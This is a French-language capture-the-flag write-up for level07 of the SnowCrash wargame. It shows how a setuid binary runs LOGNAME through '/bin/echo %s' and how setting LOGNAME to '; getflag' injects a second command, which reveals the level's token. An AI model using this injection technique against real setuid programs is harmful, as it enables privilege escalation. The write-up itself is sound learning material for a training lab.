# Level07
## Observations

Pour ce level, on retrouve un fichier binaire executable appelé `level07` dans le home directory.
Ce fichier, dispose d'un setuid bit `s`, ce qui segnifie que lorsque que je (groupe `level07`)
vais l'executer, je vais le faire en tant que propriétaire `flag07`

Comme dans les levels précédents, il s'agit ici d'injecter la commande `getflag`, lors
de l'execution du binaire.

Lorsque j'execute le binaire, j'obtiens:
```sh
level07@SnowCrash:~$ ./level07
level07
```

En utilisant la commande strings sur le binaire, je repère 2 lignes suspectes:
```
LOGNAME
/bin/echo %s
```

Sachant qu'à ce stade la variable d'environnement `LOGNAME`, vaut "level07", je
peux essayer de modifier l'environnement en lançant le binaire pour confirmer cela:
```sh
level07@SnowCrash:~$ env LOGNAME="toto" ./level07
toto
```

## Résolution

J'essaye dans un premier temps d'injecter directement la commande avec plusieurs techniques: 
```sh
level07@SnowCrash:~$ env LOGNAME="$(getflag)" ./level07
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
level07@SnowCrash:~$ env LOGNAME="`getflag`" ./level07
Check flag.Here is your token :
sh: 2: Syntax error: ")" unexpected
```

> **Note**: les '"' me permettent d'echapper au comportement de mon shell qui remplace
> ce qui se situe à l'interieur par le résultat de ma commande dans la session
> courante utilisateur `level07`.

A priori, ça ne marche pas comme ça. En regardant la ligne: `/bin/echo %s`, je pense
à une autre technique, en effet on peut chainer les commandes dans un shell,
avec des opérateurs comme '&' ou ';'. De plus echo peut marcher sans arguments.
Je decide donc de chainer la commande pour qu'elle ressemble à `/bin/echo; getflag`:

```sh
level07@SnowCrash:~$ env LOGNAME="; getflag" ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

Et voilà, j'ai mon flag, je peux passer au level suivant.
